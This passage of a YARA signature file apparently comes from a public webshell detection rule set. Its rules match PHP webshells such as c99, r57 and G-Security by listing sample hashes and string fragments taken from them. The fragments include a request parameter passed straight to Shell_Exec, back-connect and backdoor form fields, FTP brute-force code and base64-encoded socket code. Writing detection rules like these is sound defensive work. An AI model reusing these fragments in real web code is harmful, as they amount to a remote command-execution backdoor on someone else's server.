		hash = "c6381412df74dbf3bcd5a2b31522b544"
		logic_hash = "56b5b9e5518fa8a4be8c48735e997a538b0e534ad8fd72c1419dc0e8353bbc00"
		score = 75
		quality = 85
		tags = ""

	strings:
		$s1 = "<title>G-Security Webshell</title>" fullword
		$s2 = "<input type=TEXT name=\"-cmd\" size=64 value=\"<?=$cmd?>\" " fullword
		$s3 = "<? if($cmd != \"\") print Shell_Exec($cmd);?>" fullword
		$s4 = "<? $cmd = $_REQUEST[\"-cmd\"];?>" fullword

	condition:
		all of them
}

rule SIGNATURE_BASE__1_C2007_Php_Php_C100_Php_1
{
	meta:
		description = "Semi-Auto-generated  - from files 1.txt, c2007.php.php.txt, c100.php.txt"
		author = "Neo23x0 Yara BRG + customization by Stefan -dfate- Molls"
		id = "00ada6a4-a32a-5184-867d-e10a8c95c41c"
		date = "2025-03-29"
		modified = "2025-03-29"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/yara/thor-webshells.yar#L4972-L4986"
		license_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/LICENSE"
		logic_hash = "6f6cb7c210bcd0f84c2ccff52850b1d673622ae49b83d614d63b5bbba7392327"
		score = 75
		quality = 85
		tags = ""
		super_rule = 1
		hash0 = "44542e5c3e9790815c49d5f9beffbbf2"
		hash1 = "d089e7168373a0634e1ac18c0ee00085"
		hash2 = "38fd7e45f9c11a37463c3ded1c76af4c"

	strings:
		$s0 = "echo \"<b>Changing file-mode (\".$d.$f.\"), \".view_perms_color($d.$f).\" (\""
		$s3 = "echo \"<td>&nbsp;<a href=\\\"\".$sql_surl.\"sql_act=query&sql_query=\".ur"

	condition:
		1 of them
}

rule SIGNATURE_BASE__Nst_Php_Php_Img_Php_Php_Nstview_Php_Php_1
{
	meta:
		description = "Semi-Auto-generated  - from files nst.php.php.txt, img.php.php.txt, nstview.php.php.txt"
		author = "Neo23x0 Yara BRG + customization by Stefan -dfate- Molls"
		id = "238242f5-4e57-5edb-8806-ea5e06f1f637"
		date = "2025-03-29"
		modified = "2025-03-29"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/yara/thor-webshells.yar#L4987-L5002"
		license_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/LICENSE"
		logic_hash = "b1e13f75edbbc8f9263e0e516a54330ce57190ba0b45813dad4bafeaeefa389b"
		score = 75
		quality = 85
		tags = ""
		super_rule = 1
		hash0 = "ddaf9f1986d17284de83a17fe5f9fd94"
		hash1 = "17a07bb84e137b8aa60f87cd6bfab748"
		hash2 = "4745d510fed4378e4b1730f56f25e569"

	strings:
		$s0 = "<tr><form method=post><td><font color=red><b>Back connect:</b></font></td><td><i"
		$s1 = "$perl_proxy_scp = \"IyEvdXNyL2Jpbi9wZXJsICANCiMhL3Vzci91c2MvcGVybC81LjAwNC9iaW4v"
		$s2 = "<tr><form method=post><td><font color=red><b>Backdoor:</b></font></td><td><input"

	condition:
		1 of them
}

rule SIGNATURE_BASE__Network_Php_Php_Xinfo_Php_Php_Nfm_Php_Php_1
{
	meta:
		description = "Semi-Auto-generated  - from files network.php.php.txt, xinfo.php.php.txt, nfm.php.php.txt"
		author = "Neo23x0 Yara BRG + customization by Stefan -dfate- Molls"
		id = "4fd11db6-902d-5f1a-96c5-9dfcccce7488"
		date = "2025-03-29"
		modified = "2025-03-29"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/yara/thor-webshells.yar#L5003-L5017"
		license_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/LICENSE"
		logic_hash = "913ff19b6448d3b074440c2a5f85d85813fdf010d33dc57c89ba1e5db6455e11"
		score = 75
		quality = 85
		tags = ""
		super_rule = 1
		hash0 = "acdbba993a5a4186fd864c5e4ea0ba4f"
		hash1 = "2601b6fc1579f263d2f3960ce775df70"
		hash2 = "401fbae5f10283051c39e640b77e4c26"

	strings:
		$s0 = ".textbox { background: White; border: 1px #000000 solid; color: #000099; font-fa"
		$s2 = "<input class='inputbox' type='text' name='pass_de' size=50 onclick=this.value=''"

	condition:
		all of them
}

rule SIGNATURE_BASE__W_Php_Php_C99Madshell_V2_1_Php_Php_Wacking_Php_Php_Specialshell_99_Php_Php_1
{
	meta:
		description = "Semi-Auto-generated "
		author = "Neo23x0 Yara BRG + customization by Stefan -dfate- Molls"
		id = "ee1fd555-f1bc-59a5-998c-f6098de8623e"
		date = "2025-03-29"
		modified = "2025-03-29"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/yara/thor-webshells.yar#L5018-L5033"
		license_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/LICENSE"
		logic_hash = "a4bae5456baf0d8d894165c84d66118f2b16cfc040e299c2032eccb6a9eb4822"
		score = 75
		quality = 85
		tags = ""
		super_rule = 1
		hash0 = "38a3f9f2aa47c2e940695f3dba6a7bb2"
		hash1 = "3ca5886cd54d495dc95793579611f59a"
		hash2 = "9c5bb5e3a46ec28039e8986324e42792"
		hash3 = "09609851caa129e40b0d56e90dfc476c"

	strings:
		$s2 = "echo \"<hr size=\\\"1\\\" noshade><b>Done!</b><br>Total time (secs.): \".$ft"
		$s3 = "$fqb_log .= \"\\r\\n------------------------------------------\\r\\nDone!\\r"

	condition:
		1 of them
}

rule SIGNATURE_BASE__R577_Php_Php_Sniper_SA_Shell_Php_R57_Php_Php_R57_Shell_Php_Php_Spy_Php_Php_S_Php_Php_1
{
	meta:
		description = "Semi-Auto-generated "
		author = "Neo23x0 Yara BRG + customization by Stefan -dfate- Molls"
		id = "44b53124-c8b6-545b-819f-77fd65e5d61b"
		date = "2025-03-29"
		modified = "2025-03-29"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/yara/thor-webshells.yar#L5034-L5051"
		license_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/LICENSE"
		logic_hash = "0df3e00f752f85aa1f150c01e3ef41b9a5cd3d3ce2060965992320cb3c4d87ae"
		score = 75
		quality = 85
		tags = ""
		super_rule = 1
		hash0 = "0714f80f35c1fddef1f8938b8d42a4c8"
		hash1 = "911195a9b7c010f61b66439d9048f400"
		hash2 = "eddf7a8fde1e50a7f2a817ef7cece24f"
		hash3 = "8023394542cddf8aee5dec6072ed02b5"
		hash4 = "eed14de3907c9aa2550d95550d1a2d5f"
		hash5 = "817671e1bdc85e04cc3440bbd9288800"

	strings:
		$s2 = "'eng_text71'=>\"Second commands param is:\\r\\n- for CHOWN - name of new owner o"
		$s4 = "if(!empty($_POST['s_mask']) && !empty($_POST['m'])) { $sr = new SearchResult"

	condition:
		1 of them
}

rule SIGNATURE_BASE__C99Shell_V1_0_Php_Php_C99Php_Sses_Php_Php_Ctt_Sh_Php_Php_1
{
	meta:
		description = "Semi-Auto-generated  - from files c99shell_v1.0.php.php.txt, c99php.txt, SsEs.php.php.txt, ctt_sh.php.php.txt"
		author = "Neo23x0 Yara BRG + customization by Stefan -dfate- Molls"
		id = "ce88027c-ae08-59f3-948d-6f3d58515468"
		date = "2025-03-29"
		modified = "2025-03-29"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/yara/thor-webshells.yar#L5052-L5068"
		license_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/LICENSE"
		logic_hash = "137f98b636ec012d7d5e687f7d24ae88e8d3261360e60a4bbc03da248cce381e"
		score = 75
		quality = 85
		tags = ""
		super_rule = 1
		hash0 = "d8ae5819a0a2349ec552cbcf3a62c975"
		hash1 = "9e9ae0332ada9c3797d6cee92c2ede62"
		hash2 = "6cd50a14ea0da0df6a246a60c8f6f9c9"
		hash3 = "671cad517edd254352fe7e0c7c981c39"

	strings:
		$s0 = "\"AAAAACH5BAEAAAkALAAAAAAUABQAAAR0MMlJqyzFalqEQJuGEQSCnWg6FogpkHAMF4HAJsWh7/ze\""
		$s2 = "\"mTP/zDP//2YAAGYAM2YAZmYAmWYAzGYA/2YzAGYzM2YzZmYzmWYzzGYz/2ZmAGZmM2ZmZmZmmWZm\""
		$s4 = "\"R0lGODlhFAAUAKL/AP/4/8DAwH9/AP/4AL+/vwAAAAAAAAAAACH5BAEAAAEALAAAAAAUABQAQAMo\""

	condition:
		2 of them
}

rule SIGNATURE_BASE__R577_Php_Php_Spy_Php_Php_S_Php_Php_1
{
	meta:
		description = "Semi-Auto-generated  - from files r577.php.php.txt, spy.php.php.txt, s.php.php.txt"
		author = "Neo23x0 Yara BRG + customization by Stefan -dfate- Molls"
		id = "d287136c-534b-51a4-88fc-40ef9f22d910"
		date = "2025-03-29"
		modified = "2025-03-29"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/yara/thor-webshells.yar#L5069-L5083"
		license_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/LICENSE"
		logic_hash = "09892789e8dad16f9fc7c4e22525e5d0af3af401a4b2655b70f7a6856888875c"
		score = 75
		quality = 85
		tags = ""
		super_rule = 1
		hash0 = "0714f80f35c1fddef1f8938b8d42a4c8"
		hash1 = "eed14de3907c9aa2550d95550d1a2d5f"
		hash2 = "817671e1bdc85e04cc3440bbd9288800"

	strings:
		$s2 = "echo $te.\"<div align=center><textarea cols=35 name=db_query>\".(!empty($_POST['"
		$s3 = "echo sr(45,\"<b>\".$lang[$language.'_text80'].$arrow.\"</b>\",\"<select name=db>"

	condition:
		1 of them
}

rule SIGNATURE_BASE_Webshell_C99_Generic_1
{
	meta:
		description = "Semi-Auto-generated "
		author = "Neo23x0 Yara BRG + customization by Stefan -dfate- Molls"
		id = "393e738a-b4c2-5630-a55f-c3caee4ff75e"
		date = "2025-03-29"
		modified = "2025-03-29"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/yara/thor-webshells.yar#L5084-L5104"
		license_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/LICENSE"
		logic_hash = "422bc3a0d9b04b1e37ad954faacb1ec7841fe529c1eb19634bdbfe83da374c73"
		score = 75
		quality = 85
		tags = ""
		super_rule = 1
		hash0 = "38a3f9f2aa47c2e940695f3dba6a7bb2"
		hash1 = "3ca5886cd54d495dc95793579611f59a"
		hash2 = "9c5bb5e3a46ec28039e8986324e42792"
		hash3 = "d8ae5819a0a2349ec552cbcf3a62c975"
		hash4 = "9e9ae0332ada9c3797d6cee92c2ede62"
		hash5 = "09609851caa129e40b0d56e90dfc476c"
		hash6 = "671cad517edd254352fe7e0c7c981c39"

	strings:
		$s0 = "  if ($copy_unset) {foreach($sess_data[\"copy\"] as $k=>$v) {unset($sess_data[\""
		$s1 = "  if (file_exists($mkfile)) {echo \"<b>Make File \\\"\".htmlspecialchars($mkfile"
		$s2 = "  echo \"<center><b>MySQL \".mysql_get_server_info().\" (proto v.\".mysql_get_pr"
		$s3 = "  elseif (!fopen($mkfile,\"w\")) {echo \"<b>Make File \\\"\".htmlspecialchars($m"

	condition:
		all of them
}

rule SIGNATURE_BASE__W_Php_Php_C99Madshell_V2_1_Php_Php_Wacking_Php_Php_C99Shell_V1_0_Php_Php_C99Php_Specialshell_99_Php_Php_1
{
	meta:
		description = "Semi-Auto-generated "
		author = "Neo23x0 Yara BRG + customization by Stefan -dfate- Molls"
		id = "ce88027c-ae08-59f3-948d-6f3d58515468"
		date = "2025-03-29"
		modified = "2025-03-29"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/yara/thor-webshells.yar#L5105-L5122"
		license_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/LICENSE"
		logic_hash = "b133cf947476a1c94ed90b5cd3757ca8aa429be4284d75664625896d9cfa687f"
		score = 75
		quality = 85
		tags = ""
		super_rule = 1
		hash0 = "38a3f9f2aa47c2e940695f3dba6a7bb2"
		hash1 = "3ca5886cd54d495dc95793579611f59a"
		hash2 = "9c5bb5e3a46ec28039e8986324e42792"
		hash3 = "d8ae5819a0a2349ec552cbcf3a62c975"
		hash4 = "9e9ae0332ada9c3797d6cee92c2ede62"
		hash5 = "09609851caa129e40b0d56e90dfc476c"

	strings:
		$s0 = "$sess_data[\"cut\"] = array(); c99_s"
		$s3 = "if ((!eregi(\"http://\",$uploadurl)) and (!eregi(\"https://\",$uploadurl))"

	condition:
		1 of them
}

rule SIGNATURE_BASE__W_Php_Php_Wacking_Php_Php_Specialshell_99_Php_Php_1
{
	meta:
		description = "Semi-Auto-generated  - from files w.php.php.txt, wacking.php.php.txt, SpecialShell_99.php.php.txt"
		author = "Neo23x0 Yara BRG + customization by Stefan -dfate- Molls"
		id = "c01ad0e5-1aff-5128-9d0c-5d0967532a4b"
		date = "2025-03-29"
		modified = "2025-03-29"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/yara/thor-webshells.yar#L5123-L5137"
		license_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/LICENSE"
		logic_hash = "7bdaebfb093b58a2fd33b4bbeea8465d0f724383b4855eb521a3e339ee153781"
		score = 75
		quality = 85
		tags = ""
		super_rule = 1
		hash0 = "38a3f9f2aa47c2e940695f3dba6a7bb2"
		hash1 = "9c5bb5e3a46ec28039e8986324e42792"
		hash2 = "09609851caa129e40b0d56e90dfc476c"

	strings:
		$s0 = "\"<td>&nbsp;<a href=\\\"\".$sql_surl.\"sql_act=query&sql_query=\".ur"
		$s2 = "c99sh_sqlquery"

	condition:
		1 of them
}

rule SIGNATURE_BASE__W_Php_Php_C99Madshell_V2_1_Php_Php_Wacking_Php_Php_Sses_Php_Php_Specialshell_99_Php_Php_1
{
	meta:
		description = "Semi-Auto-generated "
		author = "Neo23x0 Yara BRG + customization by Stefan -dfate- Molls"
		id = "ee1fd555-f1bc-59a5-998c-f6098de8623e"
		date = "2025-03-29"
		modified = "2025-03-29"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/yara/thor-webshells.yar#L5138-L5154"
		license_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/LICENSE"
		logic_hash = "6dbd40e19d4d5753dbd1f7e627bccc08a60430de8138a923f13e836d19dde65c"
		score = 75
		quality = 85
		tags = ""
		super_rule = 1
		hash0 = "38a3f9f2aa47c2e940695f3dba6a7bb2"
		hash1 = "3ca5886cd54d495dc95793579611f59a"
		hash2 = "9c5bb5e3a46ec28039e8986324e42792"
		hash3 = "6cd50a14ea0da0df6a246a60c8f6f9c9"
		hash4 = "09609851caa129e40b0d56e90dfc476c"

	strings:
		$s0 = "else {$act = \"f\"; $d = dirname($mkfile); if (substr($d,-1) != DIRECTORY_SEPA"
		$s3 = "else {echo \"<b>File \\\"\".$sql_getfile.\"\\\":</b><br>\".nl2br(htmlspec"

	condition:
		1 of them
}

rule SIGNATURE_BASE__R577_Php_Php_Sniper_SA_Shell_Php_R57_Php_Php_Spy_Php_Php_S_Php_Php_1
{
	meta:
		description = "Semi-Auto-generated "
		author = "Neo23x0 Yara BRG + customization by Stefan -dfate- Molls"
		id = "44b53124-c8b6-545b-819f-77fd65e5d61b"
		date = "2025-03-29"
		modified = "2025-03-29"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/yara/thor-webshells.yar#L5155-L5171"
		license_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/LICENSE"
		logic_hash = "834c33059e08e8075a8d3f69187b74f3b53afabfc37ae1f13a2f579f0948a363"
		score = 75
		quality = 85
		tags = ""
		super_rule = 1
		hash0 = "0714f80f35c1fddef1f8938b8d42a4c8"
		hash1 = "911195a9b7c010f61b66439d9048f400"
		hash2 = "eddf7a8fde1e50a7f2a817ef7cece24f"
		hash3 = "eed14de3907c9aa2550d95550d1a2d5f"
		hash4 = "817671e1bdc85e04cc3440bbd9288800"

	strings:
		$s0 = "echo sr(15,\"<b>\".$lang[$language.'_text"
		$s1 = ".$arrow.\"</b>\",in('text','"

	condition:
		2 of them
}

rule SIGNATURE_BASE__R577_Php_Php_Sniper_SA_Shell_Php_R57_Php_Php_1
{
	meta:
		description = "Semi-Auto-generated  - from files r577.php.php.txt, SnIpEr_SA Shell.php.txt, r57.php.php.txt"
		author = "Neo23x0 Yara BRG + customization by Stefan -dfate- Molls"
		id = "44b53124-c8b6-545b-819f-77fd65e5d61b"
		date = "2025-03-29"
		modified = "2025-03-29"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/yara/thor-webshells.yar#L5172-L5187"
		license_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/LICENSE"
		logic_hash = "f97846fdaac949185b4ce6a25cc276f4ae4243d891acb18c3a3ce0c18b540976"
		score = 75
		quality = 85
		tags = ""
		super_rule = 1
		hash0 = "0714f80f35c1fddef1f8938b8d42a4c8"
		hash1 = "911195a9b7c010f61b66439d9048f400"
		hash2 = "eddf7a8fde1e50a7f2a817ef7cece24f"

	strings:
		$s0 = "'ru_text9' =>'???????? ????? ? ???????? ??? ? /bin/bash'," fullword
		$s1 = "$name='ec371748dc2da624b35a4f8f685dd122'"
		$s2 = "rst.void.ru"

	condition:
		3 of them
}

rule SIGNATURE_BASE__R577_Php_Php_R57_Shell_Php_Php_Spy_Php_Php_S_Php_Php_1
{
	meta:
		description = "Semi-Auto-generated  - from files r577.php.php.txt, r57 Shell.php.php.txt, spy.php.php.txt, s.php.php.txt"
		author = "Neo23x0 Yara BRG + customization by Stefan -dfate- Molls"
		id = "7a31b923-15e5-5af4-9ad0-8d261fedf7c4"
		date = "2025-03-29"
		modified = "2025-03-29"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/yara/thor-webshells.yar#L5188-L5204"
		license_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/LICENSE"
		logic_hash = "764a374c1e4acec8978db1e7e7e326c4fa95c6f92e1ca5a6d7f892bb05ecd289"
		score = 75
		quality = 85
		tags = ""
		super_rule = 1
		hash0 = "0714f80f35c1fddef1f8938b8d42a4c8"
		hash1 = "8023394542cddf8aee5dec6072ed02b5"
		hash2 = "eed14de3907c9aa2550d95550d1a2d5f"
		hash3 = "817671e1bdc85e04cc3440bbd9288800"

	strings:
		$s0 = "echo ws(2).$lb.\" <a"
		$s1 = "$sql = \"LOAD DATA INFILE \\\"\".$_POST['test3_file']"
		$s3 = "if (empty($_POST['cmd'])&&!$safe_mode) { $_POST['cmd']=($windows)?(\"dir\"):(\"l"

	condition:
		2 of them
}

rule SIGNATURE_BASE__Wacking_Php_Php_1_Specialshell_99_Php_Php_C100_Php_1
{
	meta:
		description = "Semi-Auto-generated  - from files wacking.php.php.txt, 1.txt, SpecialShell_99.php.php.txt, c100.php.txt"
		author = "Neo23x0 Yara BRG + customization by Stefan -dfate- Molls"
		id = "3dac5550-598a-5a0f-95c3-2e0162a686ee"
		date = "2025-03-29"
		modified = "2025-03-29"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/yara/thor-webshells.yar#L5205-L5221"
		license_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/LICENSE"
		logic_hash = "0d32fc00ba2602a1140dc9030894bb9524c55b95c445a08f2bf6f8fc60108e64"
		score = 75
		quality = 85
		tags = ""
		super_rule = 1
		hash0 = "9c5bb5e3a46ec28039e8986324e42792"
		hash1 = "44542e5c3e9790815c49d5f9beffbbf2"
		hash2 = "09609851caa129e40b0d56e90dfc476c"
		hash3 = "38fd7e45f9c11a37463c3ded1c76af4c"

	strings:
		$s0 = "if(eregi(\"./shbd $por\",$scan))"
		$s1 = "$_POST['backconnectip']"
		$s2 = "$_POST['backcconnmsg']"

	condition:
		1 of them
}

rule SIGNATURE_BASE__R577_Php_Php_R57_Php_Php_R57_Shell_Php_Php_Spy_Php_Php_S_Php_Php_1
{
	meta:
		description = "Semi-Auto-generated  - from files r577.php.php.txt, r57.php.php.txt, r57 Shell.php.php.txt, spy.php.php.txt, s.php.php.txt"
		author = "Neo23x0 Yara BRG + customization by Stefan -dfate- Molls"
		id = "093892f6-ff53-5bd1-b7b2-fea21a9258aa"
		date = "2025-03-29"
		modified = "2025-03-29"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/yara/thor-webshells.yar#L5222-L5239"
		license_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/LICENSE"
		logic_hash = "afbd2103b0c953d6aec070ba450f43e567560bc9743423a5731cd4d6e5e36bb6"
		score = 75
		quality = 85
		tags = ""
		super_rule = 1
		hash0 = "0714f80f35c1fddef1f8938b8d42a4c8"
		hash1 = "eddf7a8fde1e50a7f2a817ef7cece24f"
		hash2 = "8023394542cddf8aee5dec6072ed02b5"
		hash3 = "eed14de3907c9aa2550d95550d1a2d5f"
		hash4 = "817671e1bdc85e04cc3440bbd9288800"

	strings:
		$s1 = "if(rmdir($_POST['mk_name']))"
		$s2 = "$r .= '<tr><td>'.ws(3).'<font face=Verdana size=-2><b>'.$key.'</b></font></td>"
		$s3 = "if(unlink($_POST['mk_name'])) echo \"<table width=100% cellpadding=0 cell"

	condition:
		2 of them
}

rule SIGNATURE_BASE__W_Php_Php_Wacking_Php_Php_Sses_Php_Php_Specialshell_99_Php_Php_1
{
	meta:
		description = "Semi-Auto-generated  - from files w.php.php.txt, wacking.php.php.txt, SsEs.php.php.txt, SpecialShell_99.php.php.txt"
		author = "Neo23x0 Yara BRG + customization by Stefan -dfate- Molls"
		id = "81480945-b684-50b6-9431-4ab7a786b214"
		date = "2025-03-29"
		modified = "2025-03-29"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/yara/thor-webshells.yar#L5240-L5256"
		license_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/LICENSE"
		logic_hash = "9bbcb687c83c01ad52e8978a60e604a74f10c33a63af3b91d0286b30dea42890"
		score = 75
		quality = 85
		tags = ""
		super_rule = 1
		hash0 = "38a3f9f2aa47c2e940695f3dba6a7bb2"
		hash1 = "9c5bb5e3a46ec28039e8986324e42792"
		hash2 = "6cd50a14ea0da0df6a246a60c8f6f9c9"
		hash3 = "09609851caa129e40b0d56e90dfc476c"

	strings:
		$s0 = "\"ext_avi\"=>array(\"ext_avi\",\"ext_mov\",\"ext_mvi"
		$s1 = "echo \"<b>Execute file:</b><form action=\\\"\".$surl.\"\\\" method=POST><inpu"
		$s2 = "\"ext_htaccess\"=>array(\"ext_htaccess\",\"ext_htpasswd"

	condition:
		1 of them
}

rule SIGNATURE_BASE_Multiple_Php_Webshells_1
{
	meta:
		description = "Semi-Auto-generated  - from files multiple_php_webshells"
		author = "Neo23x0 Yara BRG + customization by Stefan -dfate- Molls"
		id = "393e738a-b4c2-5630-a55f-c3caee4ff75e"
		date = "2025-03-29"
		modified = "2025-03-29"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/yara/thor-webshells.yar#L5258-L5279"
		license_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/LICENSE"
		logic_hash = "d55c96febd64107273001edadbda6d0a1b4b00e35fb41b46561b49fca6a9bd1b"
		score = 75
		quality = 85
		tags = ""
		super_rule = 1
		hash0 = "0714f80f35c1fddef1f8938b8d42a4c8"
		hash1 = "911195a9b7c010f61b66439d9048f400"
		hash2 = "be0f67f3e995517d18859ed57b4b4389"
		hash3 = "eddf7a8fde1e50a7f2a817ef7cece24f"
		hash4 = "8023394542cddf8aee5dec6072ed02b5"
		hash5 = "eed14de3907c9aa2550d95550d1a2d5f"
		hash6 = "817671e1bdc85e04cc3440bbd9288800"
		hash7 = "7101fe72421402029e2629f3aaed6de7"
		hash8 = "f618f41f7ebeb5e5076986a66593afd1"

	strings:
		$s0 = "kVycm9yOiAkIVxuIik7DQpjb25uZWN0KFNPQ0tFVCwgJHBhZGRyKSB8fCBkaWUoIkVycm9yOiAkIVxuI"
		$s2 = "sNCiRwcm90bz1nZXRwcm90b2J5bmFtZSgndGNwJyk7DQpzb2NrZXQoU09DS0VULCBQRl9JTkVULCBTT0"
		$s4 = "A8c3lzL3NvY2tldC5oPg0KI2luY2x1ZGUgPG5ldGluZXQvaW4uaD4NCiNpbmNsdWRlIDxlcnJuby5oPg"

	condition:
		2 of them
}

rule SIGNATURE_BASE__W_Php_Php_C99Madshell_V2_1_Php_Php_Wacking_Php_Php_1
{
	meta:
		description = "Semi-Auto-generated  - from files w.php.php.txt, c99madshell_v2.1.php.php.txt, wacking.php.php.txt"
		author = "Neo23x0 Yara BRG + customization by Stefan -dfate- Molls"
		id = "ee1fd555-f1bc-59a5-998c-f6098de8623e"
		date = "2025-03-29"
		modified = "2025-03-29"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/yara/thor-webshells.yar#L5280-L5295"
		license_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/LICENSE"
		logic_hash = "c089f8175532ddc0e2d256b4972f7db32683bd213a456622ed27ab4844d1e435"
		score = 75
		quality = 85
		tags = ""
		super_rule = 1
		hash0 = "38a3f9f2aa47c2e940695f3dba6a7bb2"
		hash1 = "3ca5886cd54d495dc95793579611f59a"
		hash2 = "9c5bb5e3a46ec28039e8986324e42792"

	strings:
		$s0 = "<b>Dumped! Dump has been writed to "
		$s1 = "if ((!empty($donated_html)) and (in_array($act,$donated_act))) {echo \"<TABLE st"
		$s2 = "<input type=submit name=actarcbuff value=\\\"Pack buffer to archive"

	condition:
		1 of them
}

rule SIGNATURE_BASE__W_Php_Php_C99Madshell_V2_1_Php_Php_Wacking_Php_Php_C99Shell_V1_0_Php_Php_Specialshell_99_Php_Php_1
{
	meta:
		description = "Semi-Auto-generated "
		author = "Neo23x0 Yara BRG + customization by Stefan -dfate- Molls"
		id = "ce88027c-ae08-59f3-948d-6f3d58515468"
		date = "2025-03-29"
		modified = "2025-03-29"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/yara/thor-webshells.yar#L5330-L5348"
		license_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/LICENSE"
		logic_hash = "0f44dc1ff243b234a718e8dbd5cc8c4dc8eb9d3b63300a5c6ff72b86280607bf"
		score = 75
		quality = 85
		tags = ""
		super_rule = 1
		hash0 = "38a3f9f2aa47c2e940695f3dba6a7bb2"
		hash1 = "3ca5886cd54d495dc95793579611f59a"
		hash2 = "9c5bb5e3a46ec28039e8986324e42792"
		hash3 = "d8ae5819a0a2349ec552cbcf3a62c975"
		hash4 = "09609851caa129e40b0d56e90dfc476c"

	strings:
		$s0 = "c99ftpbrutecheck"
		$s1 = "$ftpquick_t = round(getmicrotime()-$ftpquick_st,4);" fullword
		$s2 = "$fqb_lenght = $nixpwdperpage;" fullword
		$s3 = "$sock = @ftp_connect($host,$port,$timeout);" fullword

	condition:
		2 of them
}

rule SIGNATURE_BASE__W_Php_Php_Wacking_Php_Php_C99Shell_V1_0_Php_Php_C99Php_Specialshell_99_Php_Php_1
{
	meta:
		description = "Semi-Auto-generated "
		author = "Neo23x0 Yara BRG + customization by Stefan -dfate- Molls"
		id = "ce88027c-ae08-59f3-948d-6f3d58515468"
		date = "2025-03-29"
		modified = "2025-03-29"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/yara/thor-webshells.yar#L5349-L5365"
		license_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/LICENSE"
		logic_hash = "e9cd7425b806f71d8889f5df7f3fc2f4a692279fc4e495104646cfe28c5b5fe5"
		score = 75
		quality = 85
		tags = ""
		super_rule = 1
		hash0 = "38a3f9f2aa47c2e940695f3dba6a7bb2"
		hash1 = "9c5bb5e3a46ec28039e8986324e42792"
		hash2 = "d8ae5819a0a2349ec552cbcf3a62c975"
		hash3 = "9e9ae0332ada9c3797d6cee92c2ede62"
